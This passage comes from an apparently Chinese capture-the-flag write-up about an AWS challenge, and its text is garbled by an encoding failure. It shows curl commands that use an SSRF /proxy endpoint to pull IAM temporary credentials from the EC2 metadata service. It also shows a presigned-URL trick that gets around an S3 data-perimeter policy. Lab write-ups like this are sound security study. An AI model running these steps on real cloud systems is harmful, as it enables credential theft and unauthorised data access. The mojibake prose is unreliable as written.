IP</td><td>ä¿¡æ¯æ€§</td></tr><tr><td>`security-groups`</td><td>å®‰å…¨ç»„åç§°</td><td>å¯ç”¨äºä¾§ä¿¡é“åˆ†æ</td></tr><tr><td>`mac`&#x2F;`network&#x2F;interfaces&#x2F;`</td><td>ç½‘ç»œä¿¡æ¯</td><td>å¯ç”¨äºç½‘ç»œå®šä½ï¼Œä½†ä¸æ•æ„Ÿ</td></tr></tbody></table><p>å½“æˆ‘ä»¬è®¿é—® <code>iam/</code> è·¯å¾„åï¼Œä¼šè¿”å›å­è·¯å¾„<code>security-credentials/</code>ï¼Œç„¶åç»§ç»­è¿›è¡Œè·¯å¾„éå†ï¼Œå°±ä¼šå¾—åˆ°ä¸€äº›å‡­è¯ä¿¡æ¯ã€‚<code>identity-credentials/</code> è·¯å¾„ä¹Ÿè¿›è¡Œç±»ä¼¼çš„è·¯å¾„éå†æ“ä½œï¼š</p><ul><li><p><code>iam/security-credentials/challenge01-5592368</code>è·¯å¾„ï¼šåŒ…å«ç»‘å®šåˆ°å®ä¾‹è§’è‰²çš„ IAM è§’è‰²åå’Œä¸´æ—¶å‡­è¯</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368&quot;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="/image/image_iKo2qTkwzg.png" alt="å›¾ 12ï¼šä» EC2 å®ä¾‹çš„ iam&#x2F;security-credentials&#x2F;challenge01-5592368 è·¯å¾„è·å– IAM ä¸´æ—¶å‡­è¯" title="å›¾ 12ï¼šä» EC2 å®ä¾‹çš„ iam&#x2F;security-credentials&#x2F;challenge01-5592368 è·¯å¾„è·å– IAM ä¸´æ—¶å‡­è¯"></p><ul><li><p><code>identity-credentials/ec2/security-credentials/ec2-instance</code>è·¯å¾„ï¼šè¾ƒæ–°æ ¼å¼ï¼Œç”¨äºæä¾›ç›¸åŒç±»å‹çš„ä¸´æ—¶ AWS å‡­è¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&quot;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="/image/image_V-suVkmbOh.png" alt="å›¾ 13ï¼šä» EC2 å®ä¾‹çš„  identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance  è·¯å¾„è·å– IAM ä¸´æ—¶å‡­è¯" title="å›¾ 13ï¼šä» EC2 å®ä¾‹çš„  identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance  è·¯å¾„è·å– IAM ä¸´æ—¶å‡­è¯"></p><p>é‡åˆ°ä¸¤ä¸ªä¸åŒçš„ IAM ä¸´æ—¶å‡­è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹è¿°å‘½ä»¤ï¼Œå¯¹å®ƒä»¬çš„æƒé™è¿›è¡ŒåŒºåˆ†è¾¨è®¤ã€‚</p><ul><li><p>æ­¥éª¤ 1ï¼šä½¿ç”¨<code>aws configure set</code> æ‰‹åŠ¨è®¾ç½®æ‰€æœ‰å­—æ®µï¼ˆåŒ…æ‹¬ tokenï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure <span class="hljs-built_in">set</span> aws_access_key_id YOUR_ACCESS_KEY_ID<br>aws configure <span class="hljs-built_in">set</span> aws_secret_access_key YOUR_SECRET_ACCESS_KEY<br>aws configure <span class="hljs-built_in">set</span> aws_session_token YOUR_SESSION_TOKEN<br><br></code></pre></td></tr></table></figure></li><li><p>æ­¥éª¤ 2ï¼šæŸ¥è¯¢å½“å‰å‡­è¯æ‰€ä»£è¡¨çš„èº«ä»½ä¿¡æ¯ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure></li></ul><p>é€šè¿‡å¯¹æ¯”ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿™ä¸¤ä¸ªèº«ä»½å®é™…éƒ½ä»£è¡¨åŒä¸€ä¸ª EC2 å®ä¾‹è§’è‰²ï¼Œéƒ½ç”±åŒä¸€è§’è‰²æ´¾ç”Ÿï¼Œå…·å¤‡åŒæ ·çš„æƒé™ã€‚</p><ul><li><code>identity-credentials/ec2/security-credentials/ec2-instance</code> è¿”å›çš„è§’è‰²å<code>aws:ec2-instance</code>æ˜¯ AWS æŠ½è±¡å‡ºæ¥çš„é»˜è®¤åï¼Œæ›´æ³¨é‡éšè—è§’è‰²åç»†èŠ‚ï¼ˆä¾‹å¦‚ç”¨äºæ‰˜ç®¡æœåŠ¡ä¸­ï¼‰ï¼Œä½†ä¸åˆ©äºæƒé™å®¡è®¡ã€‚</li></ul><p><img src="/image/image_uE_RWCsndd.png" alt="å›¾ 14ï¼šè¯†åˆ« identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance çš„ä¸´æ—¶å‡­è¯çš„èº«ä»½ä¿¡æ¯" title="å›¾ 14ï¼šè¯†åˆ« identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance çš„ä¸´æ—¶å‡­è¯çš„èº«ä»½ä¿¡æ¯"></p><ul><li><code>iam/security-credentials/challenge01-5592368</code>è¿”å›çš„è§’è‰²å<code>challenge01-5592368</code>æ˜¯çœŸå®å…·ä½“çš„è§’è‰²åï¼Œæ›´ä¾¿äºè¯†åˆ«è§’è‰²æ¥æºã€æƒé™åˆ†æå’Œå®‰å…¨å®¡è®¡ã€‚</li></ul><p><img src="/image/image_g4PU-qh09M.png" alt="å›¾ 15ï¼šè¯†åˆ« iam&#x2F;security-credentials&#x2F;challenge01-5592368 çš„ä¸´æ—¶å‡­è¯çš„èº«ä»½ä¿¡æ¯" title="å›¾ 15ï¼šè¯†åˆ« iam&#x2F;security-credentials&#x2F;challenge01-5592368 çš„ä¸´æ—¶å‡­è¯çš„èº«ä»½ä¿¡æ¯"></p><h3 id="2-6-åˆ†ææƒé™ï¼šå°è¯•è®¿é—®-S3-å†…å®¹"><a href="#2-6-åˆ†ææƒé™ï¼šå°è¯•è®¿é—®-S3-å†…å®¹" class="headerlink" title="2.6 åˆ†ææƒé™ï¼šå°è¯•è®¿é—® S3 å†…å®¹"></a>2.6 åˆ†ææƒé™ï¼šå°è¯•è®¿é—® S3 å†…å®¹</h3><p>æˆ‘ä»¬ç›´æ¥æ‹¿<code>challenge01-5592368</code>çš„ IAM ä¸´æ—¶å‡­è¯æ¥è¿›è¡Œæµ‹è¯•ï¼Œè¯•å›¾é€’å½’åˆ—å‡ºå­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://challenge01-470f711 --recursive<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸè¿‡åï¼Œæˆ‘ä»¬å†å°†<code>private/flag.txt</code>çš„æ–‡ä»¶å†…å®¹ä¸‹è½½ä¸‹æ¥å¹¶ç›´æ¥è¾“å‡ºåˆ°ç»ˆç«¯ä¸­ã€‚ä½†æ–‡ä»¶ä¸‹è½½å¤±è´¥ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">aws s3 cp s3://challenge01-470f711/private/flag.txt -<br></code></pre></td></tr></table></figure><p><img src="/image/image_Ujg069vruY.png" alt="å›¾ 16 ä½¿ç”¨ challenge01-5592368 çš„ IAM ä¸´æ—¶å‡­è¯åˆ—å‡º S3 å­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡ï¼Œä½†æ— æ³•ä¸‹è½½" title="å›¾ 16 ä½¿ç”¨ challenge01-5592368çš„ IAM ä¸´æ—¶å‡­è¯åˆ—å‡º S3 å­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡ï¼Œä½†æ— æ³•ä¸‹è½½"></p><h3 id="2-7-è¯†åˆ«éšœç¢ï¼šé­é‡æ•°æ®è¾¹ç•Œç­–ç•¥é˜»æŒ¡"><a href="#2-7-è¯†åˆ«éšœç¢ï¼šé­é‡æ•°æ®è¾¹ç•Œç­–ç•¥é˜»æŒ¡" class="headerlink" title="2.7 è¯†åˆ«éšœç¢ï¼šé­é‡æ•°æ®è¾¹ç•Œç­–ç•¥é˜»æŒ¡"></a>2.7 è¯†åˆ«éšœç¢ï¼šé­é‡æ•°æ®è¾¹ç•Œç­–ç•¥é˜»æŒ¡</h3><p>é¢˜ç›®æè¿°é‡Œè¯´äº†ï¼šç›®æ ‡ç¯å¢ƒä½¿ç”¨äº† AWS æ•°æ®è¾¹ç•Œï¼ˆData Perimeterï¼‰æ¥é™åˆ¶å¯¹è¯¥å­˜å‚¨æ¡¶å†…å®¹çš„è®¿é—®ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬ä» EC2 ä¸­è·å–çš„ IAM ä¸´æ—¶å‡­è¯ä¸­å…³äº<code>challenge01-470f711</code>å­˜å‚¨æ¡¶çš„ç­–ç•¥ã€‚</p><figure class="highlight plaintext"><figcaption><span>jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs react">aws s3api get-bucket-policy --bucket challenge01-470f711 --query &quot;Policy&quot; --output text | jq .<br></code></pre></td></tr></table></figure><p><img src="/image/image_WiC4fPQQQd.png" alt="å›¾ 17ï¼šè¾“å‡º challenge01-470f711 å­˜å‚¨æ¡¶çš„ç­–ç•¥" title="å›¾ 17ï¼šè¾“å‡º challenge01-470f711 å­˜å‚¨æ¡¶çš„ç­–ç•¥"></p><p>è¿™æ˜¯ä¸€ä¸ªåŸºäº VPC Endpoint çš„è®¿é—®é™åˆ¶ç­–ç•¥ï¼Œå±äº AWS å®æ–½æ•°æ®è¾¹ç•Œ æ§åˆ¶çš„ä¸€ç§å…¸å‹æ–¹å¼ã€‚è¯¥ç­–ç•¥æ–‡æ¡£çš„ä½œç”¨æ˜¯ï¼šåªæœ‰é€šè¿‡ VPCE ä¸º<code>vpce-0dfd8b6aa1642a057</code> çš„è¯·æ±‚ï¼Œæ‰èƒ½è¯»å–<code>private/*</code> ä¸‹çš„å¯¹è±¡ã€‚å¦åˆ™æ‹’ç»ã€‚</p><p>AWS çš„æ•°æ®è¾¹ç•Œæ˜¯ä¸€ç§å®‰å…¨è®¾è®¡æ¨¡å¼ï¼Œç”¨äºé™åˆ¶æ•°æ®åªèƒ½åœ¨ç»„ç»‡å†…éƒ¨è®¿é—®ï¼Œé˜²æ­¢è¢«è·¨å¢ƒæˆ–è·¨è´¦æˆ·æ³„éœ²ã€‚è¿™é‡Œä½¿ç”¨çš„æœºåˆ¶æ˜¯ï¼š<strong>S3 + VPC Endpoint + Bucket Policy ä¸­çš„</strong>**<code>aws:SourceVpce</code>æ¡ä»¶ **ã€‚å±äºæ•°æ®è¾¹ç•Œç­–ç•¥çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œå®˜æ–¹åœ¨æ•°æ®å¤–æ³„é˜²æŠ¤ï¼ˆDLPï¼‰æ–‡æ¡£ä¸­ä¹Ÿæ¨èè¿™ç§åšæ³•ã€‚è¯¦æƒ…è¯·çœ‹<a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html" title="ã€ŠWhat is Amazon S3?ã€‹">ã€ŠWhat is Amazon S3?ã€‹</a></p><p><img src="/image/image_ul60bJoNwG.png" alt="å›¾ 18ï¼šAWS å®˜æ–¹æ¨èçš„å®ç°æ•°æ®è¾¹ç•Œç­–ç•¥çš„æ–¹å¼" title="å›¾ 18ï¼šAWS å®˜æ–¹æ¨èçš„å®ç°æ•°æ®è¾¹ç•Œç­–ç•¥çš„æ–¹å¼"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬å‰é¢åšäº†å“ªäº›åŠªåŠ›ï¼Œé‡åˆ°äº†ä»€ä¹ˆé—®é¢˜ã€‚</p><p>å‡è®¾ä½ ç«™åœ¨å ¡å’çš„å¤–é¢ï¼Œå››å¤„è¢«é«˜å¢™åŒ…å›´ï¼Œä½ è‡ªå·±æ˜¯æ— æ³•ç›´æ¥æ½œå…¥çš„ã€‚ä½†ä½ çªç„¶å‘ç°äº†ä¸€æ‰‡çª—æˆ·ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/<br></code></pre></td></tr></table></figure><p>è¿™ä¸æ˜¯ä¸€æ‰‡æ™®é€šçš„çª—ï¼Œè€Œæ˜¯ä¸€æ‰‡å¯ä»¥å¸®ä½ ä¼ è¯çš„çª—â€”â€”ä½ åªè¦æŠŠä½ æƒ³è¯´çš„è¯ï¼ˆURLï¼‰å¡è¿›å»ï¼Œå®ƒå°±ä¼šæ›¿ä½ åœ¨å†…éƒ¨å–Šå‡ºæ¥ã€‚</p><p>è€Œ<code>/proxy</code> æ¥å£å°±æ˜¯ä¸€å°æ”¾åœ¨å ¡å’é‡Œé¢çš„ä¼ å£°ç­’ï¼Œä½ åªéœ€è¦åœ¨å¤–é¢æ‚„å’ªè¯´ä¸€å¥ï¼šâ€œå¸®æˆ‘çœ‹ä¸€ä¸‹ 169.254.169.254 å˜›ï½â€ï¼Œå®ƒå°±çœŸçš„æ›¿ä½ é—®äº†ï¼è€Œ 169.254.169.254 æ˜¯ EC2 å®ä¾‹çš„å†…éƒ¨æƒ…æŠ¥å±€å…ƒæ•°æ®æœåŠ¡ï¼Œå¤–éƒ¨æ˜¯ç»å¯¹æ¥è§¦ä¸åˆ°çš„ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™å°±æ„å‘³ç€ï¼š</p><ul><li>è¿™ä¸ª <code>/proxy</code> å¾ˆæœ‰å¯èƒ½æ˜¯éƒ¨ç½²åœ¨ EC2 å®ä¾‹ä¸­çš„ï¼›</li><li>å®ƒå±äºæŸä¸ªå†…éƒ¨ç½‘ç»œï¼ˆVPCï¼‰ï¼Œè€Œä¸”è¿™ä¸ª VPC æ­£å¥½è¿ç€ä¸€ä¸ª S3 çš„ VPC ç«¯ç‚¹ï¼›</li></ul><p>é‚£ä¹ˆä½ è®©å®ƒå‘è¯·æ±‚ï¼Œå°±ç­‰äºå€Ÿäº†ä¸€è‰˜åœ¨å ¡å’é‡Œçš„èˆ¹ï¼Œå¸®ä½ å·å·ç©¿è¿‡å†…ç½‘ï¼Œå»è”ç³»åªæœ‰â€œå ¡å’å†…éƒ¨â€èƒ½è®¿é—®çš„ S3 å¯¹è±¡ã€‚äºæ˜¯ï¼Œä½ ç¾æ»‹æ»‹åœ°è®© <code>/proxy</code> å»å¸®ä½ è®¿é—® S3ï¼Œç»“æœ S3 æŠŠä½ æŒ¡åœ¨é—¨å¤–ï¼Œä¸€å·´æŒæ‰“å›æ¥ï¼šForbiddenï¼ï¼</p><p><img src="/image/image_vzLYj6-VDQ.png" alt="å›¾ 19ï¼šç›´æ¥è®© &#x2F;proxy å»è®¿é—®å­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡å¤±è´¥" title="å›¾ 19ï¼šç›´æ¥è®© &#x2F;proxy å»è®¿é—®å­˜å‚¨æ¡¶ä¸­çš„å¯¹è±¡å¤±è´¥"></p><p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º S3 è¯´ï¼šâ€œä½ è™½ç„¶æ˜¯ä»å…è®¸çš„ç½‘ç»œï¼ˆVPC Endpointï¼‰è¿‡æ¥çš„ï¼Œä½†ä½ æ²¡ç¥¨å•Šï¼â€ï¼Œè€Œè¿™ä¸ªâ€œç¥¨â€æŒ‡çš„å°±æ˜¯ç­¾åï¼Œä¹Ÿå°±æ˜¯è®¿é—®å‡­è¯ã€‚å³ä½¿ä½ é€šè¿‡äº†ç½‘ç»œè¾¹ç•Œï¼Œä¹Ÿå¾—è¯´æ˜ä½ æ˜¯è°ã€‚è¿™ä¸ªæ—¶å€™ä½ æ„è¯†åˆ°ï¼š</p><ul><li><code>/proxy</code>åªæ˜¯ä¸€ä¸ª HTTP è¯·æ±‚ä¸­ç»§æ¥å£ï¼Œå®ƒä¸ä¼šä½¿ç”¨ EC2 å®ä¾‹è‡ªèº«çš„ AWS å‡­è¯å»å‘èµ·å¸¦ç­¾åçš„ S3 è¯·æ±‚ï¼›</li><li>å®ƒä¸æ˜¯ç”¨ AWS SDK å†™çš„ï¼Œä¹Ÿæ²¡æœ‰è‡ªåŠ¨æ³¨å…¥ IAM ä¸´æ—¶å‡­è¯æ¥â€œä»£è¡¨ä½ â€ç­¾åï¼›</li><li>æ‰€ä»¥å³ä½¿å®ƒä»â€œå ¡å’å†…éƒ¨â€å‘å‡ºè¯·æ±‚ï¼Œæ²¡æœ‰ç­¾åçš„ HTTP è¯·æ±‚ä¹Ÿä¼šè¢« S3 æ‹’ç»ã€‚</li></ul><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼šä½ æœ‰äº†ä¸€è‰˜å·å·æ½œå…¥å†…ç½‘çš„èˆ¹ï¼ˆ<code>/proxy</code>ï¼‰ï¼Œä½†èˆ¹ä¸Šæ²¡æœ‰èˆ¹ç¥¨ï¼ˆç­¾åï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸Šä¸äº†å²¸ï¼ˆè®¿é—®ä¸åˆ° S3ï¼‰ã€‚æ¥ä¸‹æ¥ä½ éœ€è¦åšçš„äº‹æƒ…æ˜¯ï¼šè‡ªå·±åœ¨å¤–é¢å…ˆä¹°å¥½ç¥¨ï¼Œç„¶åæŠŠç¥¨å¡ç»™é‚£è‰˜èˆ¹ï¼Œå†è®©å®ƒè¿›å»ï¼Œå°±èƒ½é¡ºåˆ©é€šè¡Œäº†ã€‚</p><p><img src="/image/image_2_sBWwwLJ9.png" alt="å›¾ 20ï¼šæ€»ç»“å‰é¢æ‰€åšçš„å·¥ä½œ" title="å›¾20ï¼šæ€»ç»“å‰é¢æ‰€åšçš„å·¥ä½œ"></p><h3 id="2-8-æ›²çº¿æ•‘å›½ï¼šå€Ÿç”¨-SSRF-åŠ é¢„ç­¾å-URL-å·æ¸¡"><a href="#2-8-æ›²çº¿æ•‘å›½ï¼šå€Ÿç”¨-SSRF-åŠ é¢„ç­¾å-URL-å·æ¸¡" class="headerlink" title="2.8 æ›²çº¿æ•‘å›½ï¼šå€Ÿç”¨ SSRF åŠ é¢„ç­¾å URL å·æ¸¡"></a>2.8 æ›²çº¿æ•‘å›½ï¼šå€Ÿç”¨ SSRF åŠ é¢„ç­¾å URL å·æ¸¡</h3><p>è‹¥è¦åœ¨å¤–é¢æå‰ä¹°å¥½ç¥¨ï¼Œæˆ‘ä»¬éœ€è¦ç”Ÿæˆé¢„ç­¾å URLã€‚<strong>é¢„ç­¾å URLï¼ˆPresigned URLï¼‰</strong> æ˜¯ Amazon S3 æä¾›çš„ä¸€ç§â€œä¸´æ—¶æˆæƒé“¾æ¥â€ï¼Œè®©ä½ å¯ä»¥æŠŠ S3 ä¸Šçš„ç§æœ‰æ–‡ä»¶ï¼Œåœ¨é™å®šæ—¶é—´å†…å®‰å…¨åœ°åˆ†äº«ç»™åˆ«äººï¼Œè€Œä¸éœ€è¦ç»™å¯¹æ–¹ä»»ä½• AWS è´¦æˆ·æˆ–æƒé™ã€‚</p><p><img src="/image/image_y5wX5DdYN6.png" alt="å›¾ 21ï¼šä½¿ç”¨é¢„ç­¾å URL è®¿é—®åŸç†" title="å›¾21ï¼šä½¿ç”¨é¢„ç­¾å URL è®¿é—®åŸç†"></p><p>æ‰§è¡Œä¸‹è¿°å‘½ä»¤ï¼Œå³å¯ç”Ÿæˆé¢„ç­¾å URLï¼Œè¯¦æƒ…è¯·çœ‹ AWS å®˜æ–¹æ–‡æ¡£<a href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html" title="ã€Šä½¿ç”¨é¢„ç­¾å URL å…±äº«å¯¹è±¡ã€‹">ã€Šä½¿ç”¨é¢„ç­¾å URL å…±äº«å¯¹è±¡ã€‹</a>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 presign s3://challenge01-470f711/private/flag.txt <br></code></pre></td></tr></table></figure><p><img src="/image/image_jNB7m3zF3M.png" alt="å›¾ 22ï¼šç”Ÿæˆé¢„ç­¾å URL" title="å›¾ 22ï¼šç”Ÿæˆé¢„ç­¾åURL"></p><p>ç„¶åï¼Œæˆ‘ä»¬å†å°è¯•ä½¿ç”¨ <code>/proxy</code> å»è®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=&lt;Presigned_URL&gt;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="/image/image_x_B9HVQtu6.png" alt="å›¾ 23ï¼šè®© &#x2F;proxy æ‹¿é¢„ç­¾å URL å»è®¿é—®å¤±è´¥" title="å›¾ 23 ï¼š è®© &#x2F;proxy æ‹¿é¢„ç­¾å URL å»è®¿é—®å¤±è´¥"></p><p>è®¿é—®å¤±è´¥ï¼Œå¹¶è¿”å›ï¼š<code>HTTP error: 400 Bad Request</code>ã€‚é¢„ç­¾å URL ä¸­åŒ…å«å¾ˆå¤šç‰¹æ®Šå­—ç¬¦ï¼Œå¿…é¡»è¿›è¡Œ URL ç¼–ç ï¼Œå¦åˆ™åœ¨ä½œä¸º<code>?url=</code> å‚æ•°ä¼ ç»™ proxy æ—¶ä¼šè¢«æˆªæ–­ï¼Œå¯¼è‡´è¯·æ±‚é”™è¯¯ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆé¢„ç­¾å URL çš„æ—¶å€™ï¼ŒåŒæ—¶å°†å…¶è¿›è¡Œå®Œæ•´çš„ URL ç¼–ç ã€‚ç„¶åå†ä½¿ç”¨ <code>/proxy</code> è¿›è¡Œè®¿é—®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri <br></code></pre></td></tr></table></figure><p><img src="/image/image_t_b2U3qBFJ.png" alt="å›¾ 24ï¼šå¯¹é¢„ç­¾å URL è¿›è¡Œ URL ç¼–ç åï¼Œå†è®© &#x2F;proxy å»è®¿é—®" title="å›¾ 24ï¼šå¯¹é¢„ç­¾å URL è¿›è¡Œ URLç¼–ç åï¼Œå†è®© &#x2F;proxy å»è®¿é—®"></p><p>OKï¼Œflag å‡ºç°äº†ï¼Œå„ä½å¤§ä½¬å¿«å»è¯•è¯•å§ï¼</p><p><img src="/image/image_pE444Rt2JW.png" alt="å›¾ 25ï¼šæˆåŠŸè·å–åˆ° flag" title="å›¾ 25ï¼šæˆåŠŸè·å–åˆ° flag"></p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>è¿™é“é¢˜çš„æ”»å‡»æ ¸å¿ƒæ˜¯åˆ©ç”¨ SSRFï¼ˆé€šè¿‡<code>/proxy</code>æ¥å£ï¼‰è®¿é—® EC2 å®ä¾‹çš„å…ƒæ•°æ®æœåŠ¡ï¼Œä»è€Œè·å–ä¸´æ—¶ IAM å‡­è¯ï¼Œæ¥ç€ç»•è¿‡ S3 æ‰€è®¾ç½®çš„æ•°æ®è¾¹ç•Œç­–ç•¥ã€‚</p><p>è™½ç„¶ç›®æ ‡ç¯å¢ƒå¯ç”¨äº† IMDSv2ï¼Œå¼•å…¥äº† token æœºåˆ¶å¢åŠ äº†æ”»å‡»é—¨æ§›ï¼Œä½†è¯¥æœºåˆ¶ä»å¯ä»¥é€šè¿‡ SSRF æ–¹å¼ç»•è¿‡ã€‚</p><p>ç”±äº S3 å­˜å‚¨æ¡¶é…ç½®äº†åŸºäº VPC Endpoint çš„è®¿é—®é™åˆ¶ï¼ˆData Perimeterï¼‰ï¼Œå¯¼è‡´å³ä¾¿æ‹¥æœ‰å‡­è¯ä¹Ÿæ— æ³•ç›´æ¥è®¿é—®å—é™å¯¹è±¡ï¼Œå› æ­¤éœ€è¦å€ŸåŠ© AWS S3 çš„é¢„ç­¾å URLï¼ˆPresigned URLï¼‰å®ç°â€œæå‰ç­¾ç¥¨â€ï¼Œå†é€šè¿‡<code>/proxy</code> ç”±å†…éƒ¨å‘èµ·è¯·æ±‚ï¼Œä»è€ŒæˆåŠŸè¯»å–ç›®æ ‡æ•°æ®ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹çš„æœ¬è´¨æ˜¯ï¼šåˆ©ç”¨ EC2 çš„ IAM å‡­è¯è¿›è¡Œç­¾å â†’ å¤–éƒ¨ç”Ÿæˆé¢„ç­¾å URL â†’ å†…éƒ¨ SSRF å‘èµ·è¯·æ±‚ï¼Œå®ç°å¯¹å—ä¿æŠ¤ S3 å¯¹è±¡çš„è®¿é—®ã€‚</p><table><thead><tr><th>é˜¶æ®µ</th><th>Tactic</th><th>Technique</th><th>Procedure</th></tr></thead><tbody><tr><td>åˆå§‹ä¾¦å¯Ÿ</td><td>æƒ…æŠ¥æ”¶é›†ï¼ˆReconnaissanceï¼‰</td><td>è¯†åˆ«æš´éœ²çš„åº”ç”¨æœåŠ¡</td><td>ä½¿ç”¨`curl`æ¢æµ‹ Actuator æ¥å£ï¼Œå‘ç°ç›®æ ‡ä¸º Spring Boot åº”ç”¨ï¼Œæš´éœ²äº†`&#x2F;actuator&#x2F;env`å’Œ`&#x2F;actuator&#x2F;mappings`</td></tr><tr><td>åˆå§‹è®¿é—®</td><td>æ•æ„Ÿä¿¡æ¯æ”¶é›†ï¼ˆInformation Disclosureï¼‰</td><td>æ³„éœ²çš„ç¯å¢ƒå˜é‡</td><td>é€šè¿‡`&#x2F;actuator&#x2F;env` è·å–åˆ° S3 Bucket åç§°</td></tr><tr><td>æƒé™å°è¯•</td><td>æœªæˆæƒè®¿é—®ï¼ˆAccess Attemptï¼‰</td><td>åŒ¿åè®¿é—® S3 å­˜å‚¨æ¡¶</td><td>ä½¿ç”¨`aws s3 ls â€“no-sign-request` è®¿é—® S3 å­˜å‚¨æ¡¶å¤±è´¥ï¼Œæç¤ºæƒé™å—é™</td></tr><tr><td>æƒé™æ¢ç´¢</td><td>åŠŸèƒ½æ¥å£åˆ†æï¼ˆAPI Enumerationï¼‰</td><td>æšä¸¾ Actuator æ¥å£</td><td>`&#x2F;actuator&#x2F;mappings`æ­ç¤ºäº†å­˜åœ¨ SSRF çš„`&#x2F;proxy?url&#x3D;` æ¥å£</td></tr><tr><td>æƒé™æå‡</td><td>SSRF æ”»å‡»</td><td>è®¿é—® EC2 å…ƒæ•°æ®æœåŠ¡</td><td>ä½¿ç”¨`&#x2F;proxy` SSRF ç»•è¿‡å†…ç½‘éš”ç¦»ï¼Œè®¿é—® IMDS è·å– token å¤±è´¥ï¼Œç¡®è®¤ç›®æ ‡ä½¿ç”¨ IMDSv2</td></tr><tr><td>è®¤è¯ç»•è¿‡</td><td>SSRF + Token Bypass</td><td>è·å– EC2 token</td><td>é€šè¿‡ SSRF`PUT` è¯·æ±‚è·å– IMDSv2 tokenï¼Œå†é€šè¿‡ token æˆåŠŸè®¿é—®å…ƒæ•°æ®</td></tr><tr><td>å‡­è¯è·å–</td><td>è·å–äº‘å‡­è¯ï¼ˆCloud Credential Accessï¼‰</td><td>è®¿é—® IAM ä¸´æ—¶å‡­è¯è·¯å¾„</td><td>è¯»å–`iam&#x2F;security-credentials`å’Œ`identity-credentials` ä¸­çš„ AWS ä¸´æ—¶å‡­è¯</td></tr><tr><td>èº«ä»½è¯†åˆ«</td><td>ç¡®è®¤å‡­è¯èº«ä»½</td><td>`sts get-caller-identity`</td><td>éªŒè¯ä¸¤ä¸ªä¸´æ—¶å‡­è¯ä¸ºç›¸åŒ EC2 å®ä¾‹è§’è‰²æ´¾ç”Ÿçš„ IAM èº«ä»½</td></tr><tr><td>æ¨ªå‘ç§»åŠ¨</td><td>è®¿é—®å—é™èµ„æº</td><td>ä½¿ç”¨ IAM å‡­è¯è®¿é—® S3</td><td>ä½¿ç”¨`aws s3 ls&#x2F;cp`å°è¯•è®¿é—®`private&#x2F;flag.txt`ï¼Œä½†é­é‡ VPC Endpoint 